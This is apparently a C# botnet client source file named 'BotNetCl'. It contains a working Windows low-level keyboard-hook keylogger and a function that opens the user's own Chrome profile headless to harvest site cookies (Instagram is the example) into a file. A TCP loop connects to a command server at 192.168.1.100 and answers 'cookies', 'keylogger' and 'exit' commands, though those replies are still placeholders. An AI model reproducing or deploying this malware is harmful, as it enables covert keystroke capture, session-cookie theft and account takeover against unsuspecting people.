using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Windows.Forms;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium;
using System.Reflection.Emit;
using OpenQA.Selenium.DevTools.V115.Page;

namespace BotNetCl
{
    class Program
    {
        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9999;

        static ASCIIEncoding encoding = new ASCIIEncoding();
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        //static void Main(string[] args)
        //{
        //    new Program().start();
        //}

        private void start()
        {
            //  if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
            // Timer t = new Timer();
            //   t.Interval = 60000 * 20;
            ////   t.Elapsed += sendEmail;
            //   t.AutoReset = true;
            //   t.Enabled = true;

            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {
                        //StreamWriter file = new StreamWriter(path, true);
                        //File.SetAttributes(path, FileAttributes.Hidden);
                        //file.Write(verifyKey(i));
                        //file.Close();
                        Console.WriteLine(verifyKey(i));
                        break;
                    }
                }
            }
        }
        #region hook key board
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static string logName = "Log_";
        private static string logExtendtion = ".txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                WriteLog(vkCode);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void WriteLog(int vkCode)
        {
            Console.InputEncoding = Encoding.UTF8;
            Console.OutputEncoding = Encoding.UTF8;
            Console.Write((char)vkCode);


            string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write((char)vkCode);
            sw.Close();
        }

        static void HookKeyboard()
        {
            _hookID = SetHook(_proc);
            System.Windows.Forms.Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
        #endregion




        private String verifyKey(int code)
        {
            String key = "";

            if (code == 8) key = "[Back]";
            else if (code == 9) key = "[TAB]";
            else if (code == 13) key = "[Enter]";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = "[Space]";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = "0";
            else if (code == 49) key = "1";
            else if (code == 50) key = "2";
            else if (code == 51) key = "3";
            else if (code == 52) key = "4";
            else if (code == 53) key = "5";
            else if (code == 54) key = "6";
            else if (code == 55) key = "7";
            else if (code == 56) key = "8";
            else if (code == 57) key = "9";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 97) key = "1";
            else if (code == 98) key = "2";
            else if (code == 99) key = "3";
            else if (code == 100) key = "4";
            else if (code == 101) key = "5";
            else if (code == 102) key = "6";
            else if (code == 103) key = "7";
            else if (code == 104) key = "8";
            else if (code == 105) key = "9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 160) key = "[Shift]";
            else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 187) key = "=";
            else if (code == 186) key = "ç";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ".";
            else if (code == 192) key = "'";
            else if (code == 191) key = ";";
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219) key = "´";
            else if (code == 220) key = "]";
            else if (code == 221) key = "[";
            else if (code == 222) key = "~";
            else if (code == 226) key = "\\";
            else key = "[" + code + "]";

            return key;
        }


        public static bool IsAscii(char c)
        {
            return c < 128;
        }

        public static void connectsocket()
        {

            try
            {
                TcpClient client = new TcpClient();

                // 1. connect
                client.Connect("192.168.1.100", PORT_NUMBER);
                //Stream stream = client.GetStream();

                //Console.WriteLine("Connected to Y2Server.");
                //Console.Write("Enter your name: ");

                //string str = Console.ReadLine();

                //// 2. send
                //byte[] data = encoding.GetBytes(str);

                //stream.Write(data, 0, data.Length);

                // 3. receive
                //data = new byte[BUFFER_SIZE];
                //stream.Read(data, 0, BUFFER_SIZE);

                //Console.WriteLine(encoding.GetString(data));

                // 4.Close
                //stream.Close();
                //client.Close();

                ///////////////////////////////////////////
                Stream stream = client.GetStream();

                Console.WriteLine("Connected to Y2Server.");
                Console.Write("Enter your name: ");

                string str = Console.ReadLine();

                // 2. send
                byte[] data = encoding.GetBytes(str);

                stream.Write(data, 0, data.Length);

                // 3. receive
                data = new byte[BUFFER_SIZE];
                stream.Read(data, 0, BUFFER_SIZE);

                Console.WriteLine(encoding.GetString(data));
            }

            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }

            Console.Read();
        }

        public static void getCookies(string url)
        {
            ChromeOptions options = new ChromeOptions();
            string username = RunCommandAndGetOutput("echo %username%").Trim();
            string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";

            Console.WriteLine(path);
            options.AddArguments(path, "headless");
            // options.AddArgument("--enable - automation");
            // options.AddArguments("user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data");
            //, "--headless"
            //options.AddArgument("headless");
            // options.AddArgument("user-data-dir=C:/Users/[username]/AppData/Local/Google/Chrome/User Data");

            IWebDriver driver = new ChromeDriver(options);

            try
            {
                // Navigate to Url
                driver.Navigate().GoToUrl(url);
             


                // Get All available cookies
                var cookies = driver.Manage().Cookies.AllCookies;
                string cookiesString = "";
                foreach (var cookie in cookies)
                {
                    //Console.WriteLine($"Name: {cookie.Name}, Value: {cookie.Value}");

                    cookiesString += $"{cookie.Name}={cookie.Value};";
                    // Console.Write($"{cookie.Name}={cookie.Value};");

                }
                string logNameToWrite = "cookies"  + logExtendtion;
                StreamWriter sw = new StreamWriter(logNameToWrite, true);
                sw.WriteLine(DateTime.Now);
                sw.WriteLine(url);
                sw.WriteLine(cookiesString);
                sw.WriteLine("----------------------------------------------------------------------------------------");
                sw.Close();

            }
            finally
            {
                driver.Quit();
            }



        }

        public static void getCommandPrompt()
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine("echo %username%");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
            //string a = cmd.StandardOutput.ReadToEnd();
            //Console.WriteLine(a);
        }
        public static string RunCommandAndGetOutput(string command)
        {
            string output = "";

            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe"; // Command prompt executable
                process.StartInfo.Arguments = "/c " + command; // /c flag tells cmd.exe to run the command and exit
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();

                output = process.StandardOutput.ReadToEnd();

                process.WaitForExit();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            return output;
        }
        public static void Main(string[] args)
        {
            //getCommandPrompt();
            //Console.WriteLine(RunCommandAndGetOutput("echo %username%"));
            // connectsocket();
            // HookKeyboard();
            //string s = Console.ReadLine();
            //Console.WriteLine("echo %username%");

            // cookies tuong doi ok
            // Console.Write("Enter url:");
            //// https://www.instagram.com/

            // string url = Console.ReadLine().Trim();

            //string url = "https://www.instagram.com/";
            //getCookies(url);

            //ctrl k ctrl d format code
            // ctrl f5

            //  connectsocket();

            try
            {
                TcpClient client = new TcpClient();

                // 1. connect
                client.Connect("192.168.1.100", PORT_NUMBER);
                Stream stream = client.GetStream();

                //Console.WriteLine("Connected to Y2Server.");
                //Console.Write("Enter your name: ");

                //string str = Console.ReadLine();

                //// 2. send
                byte[] data;

                //stream.Write(data, 0, data.Length);

                // 3. receive
                while (true)
                {
                    data = new byte[BUFFER_SIZE];
                    stream.Read(data, 0, BUFFER_SIZE);
                    string command = encoding.GetString(data);

                    Console.Write(command.Trim()) ;
                    Console.Write("a");
                    if (command.StartsWith("cookies"))
                    {
                        // data = new byte[BUFFER_SIZE];

                        //data = encoding.GetBytes("cookies tra ve");


                        string str = " cookies tra ve";

                        data = encoding.GetBytes(str);
                        stream.Write(data, 0, data.Length);
                        Console.WriteLine("xong cookies");
                        

                    }
                    else if (command.StartsWith("keylogger"))
                    {
                        //data = new byte[BUFFER_SIZE];
                        //data = encoding.GetBytes("keylogger tra ve");
                        //stream.Write(data, 0, data.Length);


                        string str = " keylogger tra ve";

                        data = encoding.GetBytes(str);
                        stream.Write(data, 0, data.Length);
                        Console.WriteLine("xong keylogger");
                    }
                    else if (command.StartsWith("exit"))
                    {
                        //data = new byte[BUFFER_SIZE];
                        //data = encoding.GetBytes("keylogger tra ve");
                        //stream.Write(data, 0, data.Length);


                        string str = "done";

                        data = encoding.GetBytes(str);
                        stream.Write(data, 0, data.Length);
                        Console.WriteLine("xong keylogger");
                        client.Close();

                    }
                }

            }



            //    //Console.WriteLine(encoding.GetString(data));

            //    // 4. Close
            //    //stream.Close();
            //    //client.Close();
            //}

            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }

        }


    }

}


